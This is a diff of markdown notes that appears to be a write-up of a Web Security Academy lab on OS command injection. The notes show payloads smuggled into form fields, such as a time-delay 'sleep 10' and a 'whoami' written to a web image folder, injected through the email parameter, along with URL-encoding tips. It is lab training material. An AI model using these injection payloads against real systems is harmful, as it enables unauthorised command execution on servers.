@@ -46,9 +46,9 @@ Host: 0a2f007903dd2e578305105c006200aa.web-security-academy.net
 Origin: https://0a2f007903dd2e578305105c006200aa.web-security-academy.net
 
 Referer: https://0a2f007903dd2e578305105c006200aa.web-security-
-
-csrf=sAk5Gg9Qxxvly8VWUAGGuxQyQeYQvzyq&name=Hackerman&email=peter%40normal-user.net&subject=foo&message=bar
 ```
+email=foo@email.com` & sleep 10 #`&subject
+
 
 `&name=Hackerman&`
 
@@ -68,9 +68,9 @@ x||whoami > /var/www/images/whodat.txt||&
 
 ### The cmd injection in the email param
 be sure to URL encode it
-```
-email=foo%40email.com+%26+whoami+>+/var/www/images/whodat.txt+%23&subject
-```
+
+email=foo%40email.com+`%26+whoami+>+/var/www/images/whodat.txt+%23`&subject
+
 
 Then URL encode it, I used the Decoder tab:
 
